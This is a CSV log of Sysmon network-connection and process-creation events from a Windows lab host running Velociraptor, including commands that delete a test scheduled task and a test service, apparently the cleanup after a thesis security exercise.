_ts,ID,Timestamp,EventData,ClientId
1783860377186,3,2026-07-12T12:44:50.6741462Z,"{
 ""RuleName"": ""Usermode"",
 ""UtcTime"": ""2026-07-12 12:45:02.938"",
 ""ProcessGuid"": ""{6bc49a7d-7cd5-6a53-7102-000000009a01}"",
 ""ProcessId"": 5276,
 ""Image"": ""C:\\Users\\seguridad\\Desktop\\TFM\\Velociraptor\\velociraptor-v0.75.6-windows-amd64.exe"",
 ""User"": ""LT29\\seguridad"",
 ""Protocol"": ""tcp"",
 ""Initiated"": ""false"",
 ""SourceIsIpv6"": ""true"",
 ""SourceIp"": ""0:0:0:0:0:0:0:1"",
 ""SourceHostname"": ""LT29.ait.us.es"",
 ""SourcePort"": ""50624"",
 ""SourcePortName"": ""-"",
 ""DestinationIsIpv6"": ""true"",
 ""DestinationIp"": ""0:0:0:0:0:0:0:1"",
 ""DestinationHostname"": ""LT29.ait.us.es"",
 ""DestinationPort"": ""8443"",
 ""DestinationPortName"": ""-""
}",C.364907172793f8c7
1783860377186,3,2026-07-12T12:44:50.9430815Z,"{
 ""RuleName"": ""Usermode"",
 ""UtcTime"": ""2026-07-12 12:45:02.946"",
 ""ProcessGuid"": ""{6bc49a7d-7cd5-6a53-7102-000000009a01}"",
 ""ProcessId"": 5276,
 ""Image"": ""C:\\Users\\seguridad\\Desktop\\TFM\\Velociraptor\\velociraptor-v0.75.6-windows-amd64.exe"",
 ""User"": ""LT29\\seguridad"",
 ""Protocol"": ""tcp"",
 ""Initiated"": ""false"",
 ""SourceIsIpv6"": ""true"",
 ""SourceIp"": ""0:0:0:0:0:0:0:1"",
 ""SourceHostname"": ""LT29.ait.us.es"",
 ""SourcePort"": ""50625"",
 ""SourcePortName"": ""-"",
 ""DestinationIsIpv6"": ""true"",
 ""DestinationIp"": ""0:0:0:0:0:0:0:1"",
 ""DestinationHostname"": ""LT29.ait.us.es"",
 ""DestinationPort"": ""8443"",
 ""DestinationPortName"": ""-""
}",C.364907172793f8c7
1783860377186,3,2026-07-12T12:45:41.9093441Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:45:53.643"",
 ""ProcessGuid"": ""{6bc49a7d-7f1e-6a53-1c04-000000009a01}"",
 ""ProcessId"": 12104,
 ""Image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""User"": ""LT29\\seguridad"",
 ""Protocol"": ""tcp"",
 ""Initiated"": ""true"",
 ""SourceIsIpv6"": ""false"",
 ""SourceIp"": ""192.168.1.143"",
 ""SourceHostname"": ""LT29.ait.us.es"",
 ""SourcePort"": ""50627"",
 ""SourcePortName"": ""-"",
 ""DestinationIsIpv6"": ""false"",
 ""DestinationIp"": ""192.168.1.129"",
 ""DestinationHostname"": ""-"",
 ""DestinationPort"": ""8088"",
 ""DestinationPortName"": ""-""
}",C.364907172793f8c7
1783860377186,1,2026-07-12T12:45:50.1219652Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:45:56.121"",
 ""ProcessGuid"": ""{6bc49a7d-8c84-6a53-6705-000000009a01}"",
 ""ProcessId"": 1752,
 ""Image"": ""C:\\Windows\\System32\\svchost.exe"",
 ""FileVersion"": ""10.0.19041.1806 (WinBuild.160101.0800)"",
 ""Description"": ""Host Process for Windows Services"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""svchost.exe"",
 ""CommandLine"": ""C:\\Windows\\System32\\svchost.exe -k netsvcs -p -s NetSetupSvc"",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""NT AUTHORITY\\SYSTEM"",
 ""LogonGuid"": ""{6bc49a7d-7991-6a53-e703-000000000000}"",
 ""LogonId"": ""0x3E7"",
 ""TerminalSessionId"": ""0"",
 ""IntegrityLevel"": ""System"",
 ""Hashes"": ""MD5=B7F884C1B74A263F746EE12A5F7C9F6A,SHA256=ADD683A6910ABBBF0E28B557FAD0BA998166394932AE2ACA069D9AA19EA8FE88,IMPHASH=247B9220E5D9B720A82B2C8B5069AD69"",
 ""ParentProcessGuid"": ""{6bc49a7d-7991-6a53-0b00-000000009a01}"",
 ""ParentProcessId"": ""772"",
 ""ParentImage"": ""C:\\Windows\\System32\\services.exe"",
 ""ParentCommandLine"": ""C:\\Windows\\system32\\services.exe"",
 ""ParentUser"": ""NT AUTHORITY\\SYSTEM""
}",C.364907172793f8c7
1783860377186,3,2026-07-12T12:45:53.8750104Z,"{
 ""RuleName"": ""Usermode"",
 ""UtcTime"": ""2026-07-12 12:46:06.000"",
 ""ProcessGuid"": ""{6bc49a7d-7cd5-6a53-7102-000000009a01}"",
 ""ProcessId"": 5276,
 ""Image"": ""C:\\Users\\seguridad\\Desktop\\TFM\\Velociraptor\\velociraptor-v0.75.6-windows-amd64.exe"",
 ""User"": ""LT29\\seguridad"",
 ""Protocol"": ""tcp"",
 ""Initiated"": ""false"",
 ""SourceIsIpv6"": ""true"",
 ""SourceIp"": ""0:0:0:0:0:0:0:1"",
 ""SourceHostname"": ""LT29.ait.us.es"",
 ""SourcePort"": ""50629"",
 ""SourcePortName"": ""-"",
 ""DestinationIsIpv6"": ""true"",
 ""DestinationIp"": ""0:0:0:0:0:0:0:1"",
 ""DestinationHostname"": ""LT29.ait.us.es"",
 ""DestinationPort"": ""8443"",
 ""DestinationPortName"": ""-""
}",C.364907172793f8c7
1783860377186,3,2026-07-12T12:45:53.875031Z,"{
 ""RuleName"": ""Usermode"",
 ""UtcTime"": ""2026-07-12 12:46:06.008"",
 ""ProcessGuid"": ""{6bc49a7d-7cd5-6a53-7102-000000009a01}"",
 ""ProcessId"": 5276,
 ""Image"": ""C:\\Users\\seguridad\\Desktop\\TFM\\Velociraptor\\velociraptor-v0.75.6-windows-amd64.exe"",
 ""User"": ""LT29\\seguridad"",
 ""Protocol"": ""tcp"",
 ""Initiated"": ""false"",
 ""SourceIsIpv6"": ""true"",
 ""SourceIp"": ""0:0:0:0:0:0:0:1"",
 ""SourceHostname"": ""LT29.ait.us.es"",
 ""SourcePort"": ""50630"",
 ""SourcePortName"": ""-"",
 ""DestinationIsIpv6"": ""true"",
 ""DestinationIp"": ""0:0:0:0:0:0:0:1"",
 ""DestinationHostname"": ""LT29.ait.us.es"",
 ""DestinationPort"": ""8443"",
 ""DestinationPortName"": ""-""
}",C.364907172793f8c7
1783860510744,1,2026-07-12T12:46:27.7732237Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:46:16.753"",
 ""ProcessGuid"": ""{6bc49a7d-8c98-6a53-6805-000000009a01}"",
 ""ProcessId"": 11468,
 ""Image"": ""C:\\Windows\\System32\\cmd.exe"",
 ""FileVersion"": ""10.0.19041.746 (WinBuild.160101.0800)"",
 ""Description"": ""Windows Command Processor"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""Cmd.Exe"",
 ""CommandLine"": ""\""cmd.exe\"" /d /c schtasks.exe /delete /tn \""TFM-TEC-003\"" /f"",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18"",
 ""ParentProcessGuid"": ""{6bc49a7d-7f1e-6a53-1c04-000000009a01}"",
 ""ParentProcessId"": ""12104"",
 ""ParentImage"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""ParentCommandLine"": ""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860510744,1,2026-07-12T12:46:27.8011317Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:46:16.764"",
 ""ProcessGuid"": ""{6bc49a7d-8c98-6a53-6905-000000009a01}"",
 ""ProcessId"": 10584,
 ""Image"": ""C:\\Windows\\System32\\schtasks.exe"",
 ""FileVersion"": ""10.0.19041.1503 (WinBuild.160101.0800)"",
 ""Description"": ""Task Scheduler Configuration Tool"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""schtasks.exe"",
 ""CommandLine"": ""schtasks.exe  /delete /tn \""TFM-TEC-003\"" /f"",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=76CD6626DD8834BD4A42E6A565104DC2,SHA256=013C013E0EFD13C9380FAD58418B7ACA8356E591A5CCEFFDB910F7D8B0AD28EF,IMPHASH=ECCE05491F2E8F279F4790BCB1318C05"",
 ""ParentProcessGuid"": ""{6bc49a7d-8c98-6a53-6805-000000009a01}"",
 ""ParentProcessId"": ""11468"",
 ""ParentImage"": ""C:\\Windows\\System32\\cmd.exe"",
 ""ParentCommandLine"": ""\""cmd.exe\"" /d /c schtasks.exe /delete /tn \""TFM-TEC-003\"" /f"",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860510744,1,2026-07-12T12:46:27.8931999Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:46:16.819"",
 ""ProcessGuid"": ""{6bc49a7d-8c98-6a53-6a05-000000009a01}"",
 ""ProcessId"": 10144,
 ""Image"": ""C:\\Windows\\System32\\cmd.exe"",
 ""FileVersion"": ""10.0.19041.746 (WinBuild.160101.0800)"",
 ""Description"": ""Windows Command Processor"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""Cmd.Exe"",
 ""CommandLine"": ""\""cmd.exe\"" /d /c sc.exe delete \""TFM TEC005 Test Service\"""",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18"",
 ""ParentProcessGuid"": ""{6bc49a7d-7f1e-6a53-1c04-000000009a01}"",
 ""ParentProcessId"": ""12104"",
 ""ParentImage"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""ParentCommandLine"": ""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860510744,1,2026-07-12T12:46:27.9227257Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:46:16.834"",
 ""ProcessGuid"": ""{6bc49a7d-8c98-6a53-6b05-000000009a01}"",
 ""ProcessId"": 10204,
 ""Image"": ""C:\\Windows\\System32\\sc.exe"",
 ""FileVersion"": ""10.0.19041.1 (WinBuild.160101.0800)"",
 ""Description"": ""Service Control Manager Configuration Tool"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""sc.exe"",
 ""CommandLine"": ""sc.exe  delete \""TFM TEC005 Test Service\"""",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=3FB5CF71F7E7EB49790CB0E663434D80,SHA256=41F067C3A11B02FE39947F9EBA68AE5C7CB5BD1872A6009A4CD1506554A9ABA9,IMPHASH=803254E010814E69947095A2725B2AFD"",
 ""ParentProcessGuid"": ""{6bc49a7d-8c98-6a53-6a05-000000009a01}"",
 ""ParentProcessId"": ""10144"",
 ""ParentImage"": ""C:\\Windows\\System32\\cmd.exe"",
 ""ParentCommandLine"": ""\""cmd.exe\"" /d /c sc.exe delete \""TFM TEC005 Test Service\"""",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
